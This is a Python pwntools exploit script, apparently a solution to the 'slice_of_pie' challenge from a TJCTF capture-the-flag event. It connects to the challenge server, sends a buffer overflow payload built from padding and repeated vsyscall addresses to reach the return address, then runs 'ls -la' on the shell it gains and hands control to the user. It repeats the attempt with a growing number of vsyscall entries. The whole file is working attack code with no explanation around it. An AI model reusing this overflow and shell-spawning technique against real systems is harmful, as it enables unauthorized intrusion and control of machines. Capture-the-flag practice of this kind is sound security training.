#!/usr/bin/env python
from pwn import *

SERVER = True

def exploit(numb_vsyscall):
    if SERVER:
        p = remote('p1.tjctf.org',8004)
    else:
        p = process('./slice_of_pie')

    addr_vsyscall = 0xffffffffff600000  # vsyscall
    offset = 24

    # Specify length to write
    write_length = offset + numb_vsyscall*8
    p.sendline(str(write_length))
    
    # Payload to overflow buffer and reach return address at vsyscall
    payload = "A" * offset 
    payload += p64(addr_vsyscall) * numb_vsyscall
    payload += cyclic( (write_length - len(payload)) )

    # Send the payload
    p.sendline(payload)
    '''
    # Write to file for debugging
    with open('my_payload.txt', 'w') as f:
        f.write(str(write_length) + '\n')
        f.write(payload + '\n')
    '''

    # List directory and interact with user
    p.sendline('ls -la')
    p.interactive()

count = 1
while True:
    print("Trying %d vsyscall" % count)
    exploit(count)
    count += 1
